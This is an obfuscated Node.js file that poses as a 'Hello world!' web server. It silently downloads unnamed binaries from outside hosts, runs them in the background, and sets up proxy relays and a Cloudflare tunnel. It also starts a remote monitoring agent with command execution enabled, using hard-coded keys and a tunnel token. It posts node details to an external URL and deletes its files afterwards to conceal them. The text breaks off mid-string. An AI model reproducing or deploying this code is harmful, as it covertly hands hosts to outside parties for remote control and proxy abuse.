const _0x1a8486=_0x21b9;(function(_0x4ebea0,_0x2a5d07){const _0x508596=_0x21b9,_0x1fe69d=_0x4ebea0();while(!![]){try{const _0x222b8a=-parseInt(_0x508596(0x12f))/0x1+-parseInt(_0x508596(0x14d))/0x2+-parseInt(_0x508596(0x129))/0x3+-parseInt(_0x508596(0xd0))/0x4+-parseInt(_0x508596(0x12c))/0x5+parseInt(_0x508596(0xbf))/0x6*(-parseInt(_0x508596(0x126))/0x7)+parseInt(_0x508596(0xec))/0x8*(parseInt(_0x508596(0x150))/0x9);if(_0x222b8a===_0x2a5d07)break;else _0x1fe69d['push'](_0x1fe69d['shift']());}catch(_0x4d669c){_0x1fe69d['push'](_0x1fe69d['shift']());}}}(_0x3ac9,0x1cbc7));const express=require(_0x1a8486(0x135)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1a8486(0x115)),{promisify}=require(_0x1a8486(0x10a)),exec=promisify(require(_0x1a8486(0x8d))[_0x1a8486(0xc2)]),{execSync}=require(_0x1a8486(0x8d)),UPLOAD_URL=process[_0x1a8486(0xb0)][_0x1a8486(0xa2)]||'',PROJECT_URL=process[_0x1a8486(0xb0)][_0x1a8486(0xf0)]||'',AUTO_ACCESS=process[_0x1a8486(0xb0)][_0x1a8486(0xff)]||![],FILE_PATH=process[_0x1a8486(0xb0)][_0x1a8486(0x113)]||'./tmp',SUB_PATH=process[_0x1a8486(0xb0)][_0x1a8486(0xbb)]||'yxoyx',PORT=process[_0x1a8486(0xb0)][_0x1a8486(0xd5)]||process[_0x1a8486(0xb0)][_0x1a8486(0xf2)]||0xbb8,UUID=process[_0x1a8486(0xb0)][_0x1a8486(0xe3)]||'4a4e190f-4d5e-4bb2-8947-9cb23ec135cd',NEZHA_SERVER=process[_0x1a8486(0xb0)]['NEZHA_SERVER']||_0x1a8486(0xf9),NEZHA_PORT=process['env'][_0x1a8486(0xd4)]||'',NEZHA_KEY=process[_0x1a8486(0xb0)][_0x1a8486(0xf3)]||_0x1a8486(0xae),ARGO_DOMAIN=process[_0x1a8486(0xb0)]['ARGO_DOMAIN']||_0x1a8486(0xbd),ARGO_AUTH=process[_0x1a8486(0xb0)][_0x1a8486(0xe5)]||_0x1a8486(0x94),ARGO_PORT=process[_0x1a8486(0xb0)]['ARGO_PORT']||0xbea0,CFIP=process[_0x1a8486(0xb0)][_0x1a8486(0x11b)]||_0x1a8486(0x9e),CFPORT=process[_0x1a8486(0xb0)][_0x1a8486(0x13d)]||0x1bb,NAME=process[_0x1a8486(0xb0)][_0x1a8486(0x108)]||'Railway';!fs[_0x1a8486(0xab)](FILE_PATH)?(fs[_0x1a8486(0x145)](FILE_PATH),console[_0x1a8486(0xfe)](FILE_PATH+_0x1a8486(0x139))):console[_0x1a8486(0xfe)](FILE_PATH+_0x1a8486(0x109));function generateRandomName(){const _0x3214c6=_0x1a8486,_0x50b02a=_0x3214c6(0xa4);let _0xb3af9e='';for(let _0x184465=0x0;_0x184465<0x6;_0x184465++){_0xb3af9e+=_0x50b02a[_0x3214c6(0xd8)](Math['floor'](Math[_0x3214c6(0xaf)]()*_0x50b02a[_0x3214c6(0xa8)]));}return _0xb3af9e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1a8486(0x12d)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1a8486(0x12d)](FILE_PATH,webName),botPath=path[_0x1a8486(0x12d)](FILE_PATH,botName),subPath=path[_0x1a8486(0x12d)](FILE_PATH,_0x1a8486(0x119)),listPath=path[_0x1a8486(0x12d)](FILE_PATH,_0x1a8486(0x95)),bootLogPath=path[_0x1a8486(0x12d)](FILE_PATH,_0x1a8486(0xf1)),configPath=path[_0x1a8486(0x12d)](FILE_PATH,_0x1a8486(0xf4));function deleteNodes(){const _0x550ccb=_0x1a8486;try{if(!UPLOAD_URL)return;if(!fs[_0x550ccb(0xab)](subPath))return;let _0x26095e;try{_0x26095e=fs[_0x550ccb(0x11c)](subPath,_0x550ccb(0x140));}catch{return null;}const _0x272c6f=Buffer[_0x550ccb(0xa1)](_0x26095e,_0x550ccb(0x89))[_0x550ccb(0xe8)](_0x550ccb(0x140)),_0x597db7=_0x272c6f['split']('\x0a')[_0x550ccb(0x110)](_0x207f41=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x550ccb(0x123)](_0x207f41));if(_0x597db7['length']===0x0)return;return axios[_0x550ccb(0xba)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x550ccb(0x8b)]({'nodes':_0x597db7}),{'headers':{'Content-Type':_0x550ccb(0xe1)}})[_0x550ccb(0x131)](_0x23a724=>{return null;}),null;}catch(_0x2ae17f){return null;}}function cleanupOldFiles(){const _0x4ab6ef=_0x1a8486;try{const _0x4153c0=fs[_0x4ab6ef(0xea)](FILE_PATH);_0x4153c0['forEach'](_0x481aaa=>{const _0x578456=_0x4ab6ef,_0x3ba10c=path[_0x578456(0x12d)](FILE_PATH,_0x481aaa);try{const _0x29759e=fs['statSync'](_0x3ba10c);_0x29759e[_0x578456(0xfb)]()&&fs[_0x578456(0x12e)](_0x3ba10c);}catch(_0x428dd0){}});}catch(_0x3dba5b){}}app[_0x1a8486(0x121)]('/',function(_0x470fa0,_0x5e67d4){const _0x57deb3=_0x1a8486;_0x5e67d4[_0x57deb3(0x13e)](_0x57deb3(0xe9));});async function generateConfig(){const _0x436528=_0x1a8486,_0x1e489f={'log':{'access':_0x436528(0x9d),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x436528(0x10c)}],'decryption':_0x436528(0xeb),'fallbacks':[{'dest':0xbb9},{'path':_0x436528(0x10e),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x436528(0x13b)}},{'port':0xbb9,'listen':_0x436528(0xcf),'protocol':_0x436528(0xb9),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x436528(0xeb)}},{'port':0xbba,'listen':_0x436528(0xcf),'protocol':_0x436528(0xb9),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x436528(0xeb),'wsSettings':{'path':_0x436528(0x10e)}},'sniffing':{'enabled':!![],'destOverride':[_0x436528(0x93),_0x436528(0x13a),_0x436528(0xc1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x436528(0xcf),'protocol':_0x436528(0x136),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x436528(0x14c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x436528(0x13a),_0x436528(0xc1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x436528(0xcf),'protocol':_0x436528(0xce),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x436528(0x128)}},'sniffing':{'enabled':!![],'destOverride':[_0x436528(0x93),_0x436528(0x13a),_0x436528(0xc1)],'metadataOnly':![]}}],'dns':{'servers':[_0x436528(0xd6)]},'outbounds':[{'protocol':_0x436528(0xb3),'tag':'direct'},{'protocol':_0x436528(0x9c),'tag':_0x436528(0xdd)}]};fs[_0x436528(0x100)](path[_0x436528(0x12d)](FILE_PATH,_0x436528(0xf4)),JSON[_0x436528(0x8b)](_0x1e489f,null,0x2));}function getSystemArchitecture(){const _0x23eacd=_0x1a8486,_0x256e8f=os['arch']();return _0x256e8f===_0x23eacd(0xb8)||_0x256e8f===_0x23eacd(0x138)||_0x256e8f===_0x23eacd(0xee)?_0x23eacd(0xb8):_0x23eacd(0x132);}function downloadFile(_0x32ee39,_0x21a38e,_0x1b7a5d){const _0x26bafc=_0x1a8486,_0x1ebb49=_0x32ee39;!fs[_0x26bafc(0xab)](FILE_PATH)&&fs[_0x26bafc(0x145)](FILE_PATH,{'recursive':!![]});const _0x1e16e3=fs[_0x26bafc(0xcc)](_0x1ebb49);axios({'method':'get','url':_0x21a38e,'responseType':_0x26bafc(0x10b)})[_0x26bafc(0x114)](_0x3ee727=>{const _0xc3efa8=_0x26bafc;_0x3ee727[_0xc3efa8(0x120)][_0xc3efa8(0x143)](_0x1e16e3),_0x1e16e3['on'](_0xc3efa8(0x112),()=>{const _0x201fe9=_0xc3efa8;_0x1e16e3[_0x201fe9(0xb5)](),console[_0x201fe9(0xfe)](_0x201fe9(0x10f)+path[_0x201fe9(0x147)](_0x1ebb49)+'\x20successfully'),_0x1b7a5d(null,_0x1ebb49);}),_0x1e16e3['on'](_0xc3efa8(0xc7),_0x4149b8=>{const _0x4376b2=_0xc3efa8;fs['unlink'](_0x1ebb49,()=>{});const _0x31ab58=_0x4376b2(0x10f)+path['basename'](_0x1ebb49)+_0x4376b2(0xf6)+_0x4149b8[_0x4376b2(0xa3)];console[_0x4376b2(0xc7)](_0x31ab58),_0x1b7a5d(_0x31ab58);});})[_0x26bafc(0x131)](_0xf4ef0e=>{const _0xacd2c4=_0x26bafc,_0x31a1d4=_0xacd2c4(0x10f)+path['basename'](_0x1ebb49)+_0xacd2c4(0xf6)+_0xf4ef0e[_0xacd2c4(0xa3)];console[_0xacd2c4(0xc7)](_0x31a1d4),_0x1b7a5d(_0x31a1d4);});}async function downloadFilesAndRun(){const _0x14d7a1=_0x1a8486,_0x476dbd=getSystemArchitecture(),_0x2c7fef=getFilesForArchitecture(_0x476dbd);if(_0x2c7fef['length']===0x0){console[_0x14d7a1(0xfe)](_0x14d7a1(0xad));return;}const _0x3f91a6=_0x2c7fef[_0x14d7a1(0x141)](_0x5261bb=>{return new Promise((_0x269b4c,_0x25d61e)=>{const _0x5878ea=_0x21b9;downloadFile(_0x5261bb[_0x5878ea(0x127)],_0x5261bb['fileUrl'],(_0x51e28a,_0x581273)=>{_0x51e28a?_0x25d61e(_0x51e28a):_0x269b4c(_0x581273);});});});try{await Promise[_0x14d7a1(0xc0)](_0x3f91a6);}catch(_0x484912){console[_0x14d7a1(0xc7)](_0x14d7a1(0x11f),_0x484912);return;}function _0xa006dc(_0x1badfd){const _0x41108a=0x1fd;_0x1badfd['forEach'](_0xcb519d=>{const _0x5c7a36=_0x21b9;fs[_0x5c7a36(0xab)](_0xcb519d)&&fs[_0x5c7a36(0x105)](_0xcb519d,_0x41108a,_0xfb27ed=>{const _0x5acb7b=_0x5c7a36;_0xfb27ed?console['error'](_0x5acb7b(0xc4)+_0xcb519d+':\x20'+_0xfb27ed):console['log']('Empowerment\x20success\x20for\x20'+_0xcb519d+':\x20'+_0x41108a[_0x5acb7b(0xe8)](0x8));});});}const _0x33c3f5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xa006dc(_0x33c3f5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x28f20e=NEZHA_SERVER[_0x14d7a1(0x96)](':')?NEZHA_SERVER[_0x14d7a1(0xd2)](':')[_0x14d7a1(0xbe)]():'',_0x115918=new Set(['443',_0x14d7a1(0x125),_0x14d7a1(0xe7),'2087',_0x14d7a1(0xd9),'2053']),_0x19aa28=_0x115918[_0x14d7a1(0xc3)](_0x28f20e)?_0x14d7a1(0x11e):_0x14d7a1(0xdf),_0x916044=_0x14d7a1(0x102)+NEZHA_KEY+_0x14d7a1(0x14f)+NEZHA_SERVER+_0x14d7a1(0xcd)+_0x19aa28+_0x14d7a1(0xe6)+UUID;fs[_0x14d7a1(0x100)](path[_0x14d7a1(0x12d)](FILE_PATH,_0x14d7a1(0x86)),_0x916044);const _0x4e417e=_0x14d7a1(0x9a)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x14d7a1(0xa6);try{await exec(_0x4e417e),console['log'](phpName+_0x14d7a1(0xb7)),await new Promise(_0x16e4d6=>setTimeout(_0x16e4d6,0x3e8));}catch(_0x887656){console[_0x14d7a1(0xc7)](_0x14d7a1(0x130)+_0x887656);}}else{let _0xb45505='';const _0x114001=[_0x14d7a1(0x118),_0x14d7a1(0x125),'2096',_0x14d7a1(0x111),'2083',_0x14d7a1(0x88)];_0x114001[_0x14d7a1(0x96)](NEZHA_PORT)&&(_0xb45505=_0x14d7a1(0x13c));const _0xfcc3b6=_0x14d7a1(0x9a)+npmPath+_0x14d7a1(0xb6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x14d7a1(0x124)+NEZHA_KEY+'\x20'+_0xb45505+_0x14d7a1(0xd1);try{await exec(_0xfcc3b6),console[_0x14d7a1(0xfe)](npmName+_0x14d7a1(0xb7)),await new Promise(_0x2b7234=>setTimeout(_0x2b7234,0x3e8));}catch(_0x4d0c96){console[_0x14d7a1(0xc7)](_0x14d7a1(0x144)+_0x4d0c96);}}}else console[_0x14d7a1(0xfe)](_0x14d7a1(0xc8));const _0x29c052=_0x14d7a1(0x9a)+webPath+'\x20-c\x20'+FILE_PATH+_0x14d7a1(0x98);try{await exec(_0x29c052),console[_0x14d7a1(0xfe)](webName+_0x14d7a1(0xb7)),await new Promise(_0x6e4aac=>setTimeout(_0x6e4aac,0x3e8));}catch(_0x228386){console['error'](_0x14d7a1(0xac)+_0x228386);}if(fs[_0x14d7a1(0xab)](botPath)){let _0x5d1707;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x5d1707=_0x14d7a1(0x8a)+ARGO_AUTH;else ARGO_AUTH[_0x14d7a1(0x99)](/TunnelSecret/)?_0x5d1707='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x14d7a1(0x8e):_0x5d1707='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x14d7a1(0x92)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5d1707+_0x14d7a1(0xef)),console[_0x14d7a1(0xfe)](botName+'\x20is\x20running'),await new Promise(_0xab9c18=>setTimeout(_0xab9c18,0x7d0));}catch(_0x5f5892){console[_0x14d7a1(0xc7)]('Error\x20executing\x20command:\x20'+_0x5f5892);}}await new Promise(_0x38ad93=>setTimeout(_0x38ad93,0x1388));}function getFilesForArchitecture(_0x2b9127){const _0x5b3a5c=_0x1a8486;let _0x452a8e;_0x2b9127===_0x5b3a5c(0xb8)?_0x452a8e=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x452a8e=[{'fileName':webPath,'fileUrl':_0x5b3a5c(0xe0)},{'fileName':botPath,'fileUrl':_0x5b3a5c(0x149)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x26fb14=_0x2b9127===_0x5b3a5c(0xb8)?_0x5b3a5c(0x133):_0x5b3a5c(0x10d);_0x452a8e[_0x5b3a5c(0x146)]({'fileName':npmPath,'fileUrl':_0x26fb14});}else{const _0x443133=_0x2b9127===_0x5b3a5c(0xb8)?'https://arm64.ssss.nyc.mn/v1':_0x5b3a5c(0x8f);_0x452a8e[_0x5b3a5c(0x146)]({'fileName':phpPath,'fileUrl':_0x443133});}}return _0x452a8e;}function argoType(){const _0x3c8074=_0x1a8486;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3c8074(0xfe)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3c8074(0x96)](_0x3c8074(0xcb))){fs[_0x3c8074(0x100)](path[_0x3c8074(0x12d)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4989ed=_0x3c8074(0xe4)+ARGO_AUTH[_0x3c8074(0xd2)]('\x22')[0xb]+_0x3c8074(0x12a)+path['join'](FILE_PATH,'tunnel.json')+_0x3c8074(0x106)+ARGO_DOMAIN+_0x3c8074(0xc5)+ARGO_PORT+_0x3c8074(0x13f);fs[_0x3c8074(0x100)](path['join'](FILE_PATH,_0x3c8074(0x122)),_0x4989ed);}else console[_0x3c8074(0xfe)](_0x3c8074(0xca));}async function extractDomains(){const _0x24677c=_0x1a8486;let _0x335bef;if(ARGO_AUTH&&ARGO_DOMAIN)_0x335bef=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x335bef),await _0xe53fc3(_0x335bef);else try{const _0x4881c9=fs[_0x24677c(0x11c)](path['join'](FILE_PATH,_0x24677c(0xf1)),_0x24677c(0x140)),_0x5a8128=_0x4881c9['split']('\x0a'),_0x4348d6=[];_0x5a8128[_0x24677c(0x8c)](_0x305241=>{const _0x1c2ef4=_0x24677c,_0x4579b8=_0x305241[_0x1c2ef4(0x99)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4579b8){const _0x267c21=_0x4579b8[0x1];_0x4348d6[_0x1c2ef4(0xf8)](_0x267c21);}});if(_0x4348d6['length']>0x0)_0x335bef=_0x4348d6[0x0],console['log'](_0x24677c(0xc6),_0x335bef),await _0xe53fc3(_0x335bef);else{console[_0x24677c(0xfe)](_0x24677c(0x103)),fs[_0x24677c(0x12e)](path[_0x24677c(0x12d)](FILE_PATH,_0x24677c(0xf1)));async function _0x183e80(){const _0x23ea73=_0x24677c;try{process[_0x23ea73(0xc9)]===_0x23ea73(0xfc)?await exec(_0x23ea73(0x9f)+botName+_0x23ea73(0xf7)):await exec(_0x23ea73(0xf5)+botName[_0x23ea73(0xd8)](0x0)+']'+botName['substring'](0x1)+_0x23ea73(0x14b));}catch(_0x4b14c9){}}_0x183e80(),await new Promise(_0x5bec69=>setTimeout(_0x5bec69,0xbb8));const _0x540c16=_0x24677c(0x11a)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x24677c(0x9a)+botPath+'\x20'+_0x540c16+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0xffda5d=>setTimeout(_0xffda5d,0xbb8)),await extractDomains();}catch(_0x33c388){console['error'](_0x24677c(0x11d)+_0x33c388);}}}catch(_0x1f283c){console[_0x24677c(0xc7)](_0x24677c(0x12b),_0x1f283c);}async function _0x5b4e82(){const _0x3e8672=_0x24677c;try{const _0x5598d6=await axios[_0x3e8672(0x121)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x5598d6[_0x3e8672(0x120)]&&_0x5598d6[_0x3e8672(0x120)][_0x3e8672(0xda)]&&_0x5598d6['data'][_0x3e8672(0xb2)])return _0x5598d6[_0x3e8672(0x120)][_0x3e8672(0xda)]+'_'+_0x5598d6[_0x3e8672(0x120)][_0x3e8672(0xb2)];}catch(_0x4f40fb){try{const _0x501282=await axios[_0x3e8672(0x121)](_0x3e8672(0x14e),{'timeout':0xbb8});if(_0x501282[_0x3e8672(0x120)]&&_0x501282[_0x3e8672(0x120)][_0x3e8672(0xfa)]===_0x3e8672(0xde)&&_0x501282[_0x3e8672(0x120)][_0x3e8672(0xdc)]&&_0x501282[_0x3e8672(0x120)][_0x3e8672(0xb2)])return _0x501282[_0x3e8672(0x120)]['countryCode']+'_'+_0x501282[_0x3e8672(0x120)]['org'];}catch(_0x226333){}}return _0x3e8672(0x134);}async function _0xe53fc3(_0xde2102){const _0x117c5d=await _0x5b4e82(),_0x1bf5e9=NAME?NAME+'-'+_0x117c5d:_0x117c5d;return new Promise(_0x1ef850=>{setTimeout(()=>{const _0x127fbf=_0x21b9,_0x108240={'v':'2','ps':''+_0x1bf5e9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x127fbf(0xeb),'net':'ws','type':_0x127fbf(0xeb),'host':_0xde2102,'path':_0x127fbf(0xa7),'tls':_0x127fbf(0x13a),'sni':_0xde2102,'alpn':'','fp':_0x127fbf(0x101)},_0x225b43=_0x127fbf(0xa9)+UUID+'@'+CFIP+':'+CFPORT+_0x127fbf(0x87)+_0xde2102+_0x127fbf(0x137)+_0xde2102+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1bf5e9+'\x0a\x0avmess://'+Buffer[_0x127fbf(0xa1)](JSON['stringify'](_0x108240))[_0x127fbf(0xe8)](_0x127fbf(0x89))+_0x127fbf(0x9b)+UUID+'@'+CFIP+':'+CFPORT+_0x127fbf(0x97)+_0xde2102+_0x127fbf(0x137)+_0xde2102+_0x127fbf(0xb1)+_0x1bf5e9+_0x127fbf(0x116);console[_0x127fbf(0xfe)](Buffer[_0x127fbf(0xa1)](_0x225b43)[_0x127fbf(0xe8)](_0x127fbf(0x89))),fs[_0x127fbf(0x100)](subPath,Buffer['from'](_0x225b43)[_0x127fbf(0xe8)](_0x127fbf(0x89))),console['log'](FILE_PATH+_0x127fbf(0xa0)),uploadNodes(),app[_0x127fbf(0x121)]('/'+SUB_PATH,(_0x4cc8f8,_0x3a9703)=>{const _0x17d5c9=_0x127fbf,_0x1d080c=Buffer['from'](_0x225b43)[_0x17d5c9(0xe8)]('base64');_0x3a9703[_0x17d5c9(0xb4)](_0x17d5c9(0x148),_0x17d5c9(0xfd)),_0x3a9703[_0x17d5c9(0x13e)](_0x1d080c);}),_0x1ef850(_0x225b43);},0x7d0);});}}async function uploadNodes(){const _0x302cfe=_0x1a8486;if(UPLOAD_URL&&PROJECT_URL){const _0x35b217=PROJECT_URL+'/'+SUB_PATH,_0xd3689={'subscription':[_0x35b217]};try{const _0x2b6657=await axios[_0x302cfe(0xba)](UPLOAD_URL+_0x302cfe(0x107),_0xd3689,{'headers':{'Content-Type':'application/json'}});return _0x2b6657&&_0x2b6657['status']===0xc8?(console[_0x302cfe(0xfe)](_0x302cfe(0xed)),_0x2b6657):null;}catch(_0x19b27d){if(_0x19b27d[_0x302cfe(0xd7)]){if(_0x19b27d[_0x302cfe(0xd7)][_0x302cfe(0xfa)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x302cfe(0xab)](listPath))return;const _0x4a39d7=fs[_0x302cfe(0x11c)](listPath,_0x302cfe(0x140)),_0x55c85e=_0x4a39d7[_0x302cfe(0xd2)]('\x0a')[_0x302cfe(0x110)](_0x93c091=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x302cfe(0x123)](_0x93c091));if(_0x55c85e[_0x302cfe(0xa8)]===0x0)return;const _0x319013=JSON[_0x302cfe(0x8b)]({'nodes':_0x55c85e});try{const _0x1dd621=await axios[_0x302cfe(0xba)](UPLOAD_URL+'/api/add-nodes',_0x319013,{'headers':{'Content-Type':_0x302cfe(0xe1)}});return _0x1dd621&&_0x1dd621[_0x302cfe(0xfa)]===0xc8?(console[_0x302cfe(0xfe)](_0x302cfe(0xaa)),_0x1dd621):null;}catch(_0x306251){return null;}}else return;}}function _0x21b9(_0x22cbbc,_0x8fa9e9){_0x22cbbc=_0x22cbbc-0x86;const _0x3ac9ab=_0x3ac9();let _0x21b9a5=_0x3ac9ab[_0x22cbbc];return _0x21b9a5;}function cleanFiles(){setTimeout(()=>{const _0x36e9a0=_0x21b9,_0x3de332=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3de332[_0x36e9a0(0xf8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3de332[_0x36e9a0(0xf8)](phpPath);process[_0x36e9a0(0xc9)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x3de332[_0x36e9a0(0x12d)]('\x20')+_0x36e9a0(0x142),_0x229fff=>{const _0x1e8a61=_0x36e9a0;console[_0x1e8a61(0xdb)](),console[_0x1e8a61(0xfe)]('App\x20is\x20running'),console[_0x1e8a61(0xfe)](_0x1e8a61(0x90));}):exec('rm\x20-rf\x20'+_0x3de332['join']('\x20')+_0x36e9a0(0xd3),_0x53a39b=>{const _0x1b3163=_0x36e9a0;console[_0x1b3163(0xdb)](),console[_0x1b3163(0xfe)](_0x1b3163(0x104)),console[_0x1b3163(0xfe)](_0x1b3163(0x90));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1a613a=_0x1a8486;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1a613a(0xfe)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5b3678=await axios['post'](_0x1a613a(0xa5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1a613a(0xe1)}});return console[_0x1a613a(0xfe)](_0x1a613a(0xbc)),_0x5b3678;}catch(_0x32893){return console[_0x1a613a(0xc7)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x32893[_0x1a613a(0xa3)]),null;}}async function startserver(){const _0x385ef3=_0x1a8486;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4dab66){console[_0x385ef3(0xc7)](_0x385ef3(0x91),_0x4dab66);}}function _0x3ac9(){const _0x4790d1=['forEach','child_process','/tunnel.yml\x20run','https://amd64.ssss.nyc.mn/v1','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','http','eyJhIjoiZjc1ZDNlNTM5YjQzMjdiZjUxZGQwM2Q5YzdlOWU2ODgiLCJ0IjoiZTNjNmJmN2EtODI0Zi00ZGNlLTk4MmEtYTk4OTM0MjlhZGUyIiwicyI6IllXUXlZVE13T1RZdE0yRXhOUzAwTnpBMUxXRmxNak10TUdRMU5qazJPRFZsT0RGaSJ9','list.txt','includes','?security=tls&sni=','/config.json\x20>/dev/null\x202>&1\x20&','match','nohup\x20','\x0a\x0atrojan://','blackhole','/dev/null','cdns.doon.eu.org','taskkill\x20/f\x20/im\x20','/sub.txt\x20saved\x20successfully','from','UPLOAD_URL','message','abcdefghijklmnopqrstuvwxyz','https://oooo.serv00.net/add-url','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/vmess-argo?ed=2560','length','\x0avless://','Nodes\x20uploaded\x20successfully','existsSync','web\x20running\x20error:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','jKFBqakanLXuawX8uJTzKnyGMC5EpIbQ','random','env','&path=%2Ftrojan-argo%3Fed%3D2560#','org','freedom','set','close','\x20-s\x20','\x20is\x20running','arm','vless','post','SUB_PATH','automatic\x20access\x20task\x20added\x20successfully','railway.dnsgo.ggff.net','pop','6COzRsj','all','quic','exec','has','Empowerment\x20failed\x20for\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ArgoDomain:','error','NEZHA\x20variable\x20is\x20empty,skip\x20running','platform','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','TunnelSecret','createWriteStream','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','trojan','127.0.0.1','709028YmWSTy','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','split','\x20>/dev/null\x202>&1','NEZHA_PORT','SERVER_PORT','https+local://8.8.8.8/dns-query','response','charAt','2083','country_code','clear','countryCode','block','success','false','https://amd64.ssss.nyc.mn/web','application/json','http\x20server\x20is\x20running\x20on\x20port:','UUID','\x0a\x20\x20tunnel:\x20','ARGO_AUTH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2096','toString','Hello\x20world!','readdirSync','none','8543400mgSqSV','Subscription\x20uploaded\x20successfully','aarch64','\x20>/dev/null\x202>&1\x20&','PROJECT_URL','boot.log','PORT','NEZHA_KEY','config.json','pkill\x20-f\x20\x22[','\x20failed:\x20','.exe\x20>\x20nul\x202>&1','push','nzd.192719.xyz:8008','status','isFile','win32','text/plain;\x20charset=utf-8','log','AUTO_ACCESS','writeFileSync','firefox','\x0aclient_secret:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','App\x20is\x20running','chmod','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/api/add-subscriptions','NAME','\x20already\x20exists','util','stream','xtls-rprx-vision','https://amd64.ssss.nyc.mn/agent','/vless-argo','Download\x20','filter','2087','finish','FILE_PATH','then','path','\x0a\x20\x20\x20\x20','listen','443','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','CFIP','readFileSync','Error\x20executing\x20command:\x20','true','Error\x20downloading\x20files:','data','get','tunnel.yml','test','\x20-p\x20','8443','818083xgOfoT','fileName','/trojan-argo','345486jnSPvW','\x0a\x20\x20credentials-file:\x20','Error\x20reading\x20boot.log:','1130005ifKVxR','join','unlinkSync','84447kCHcBk','php\x20running\x20error:\x20','catch','amd','https://arm64.ssss.nyc.mn/agent','Unknown','express','vmess','&fp=firefox&type=ws&host=','arm64','\x20is\x20created','tls','tcp','--tls','CFPORT','send','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','utf-8','map','\x20>\x20nul\x202>&1','pipe','npm\x20running\x20error:\x20','mkdirSync','unshift','basename','Content-Type','https://amd64.ssss.nyc.mn/bot','Unhandled\x20error\x20in\x20startserver:','\x22\x20>\x20/dev/null\x202>&1','/vmess-argo','460972EtInjU','http://ip-api.com/json/','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0ai